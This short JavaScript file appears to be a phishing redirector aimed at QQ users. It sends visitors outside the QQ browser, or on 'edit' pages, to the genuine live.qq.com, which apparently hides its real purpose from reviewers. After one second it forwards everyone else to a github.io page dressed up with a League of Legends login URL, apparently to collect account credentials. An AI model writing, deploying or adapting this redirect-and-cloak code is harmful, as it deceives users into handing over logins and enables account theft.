function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://live.qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://ccffq.github.io/oo/url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + '?' + timestamp + 'yuge';
    location.href = url;
}, 1000);
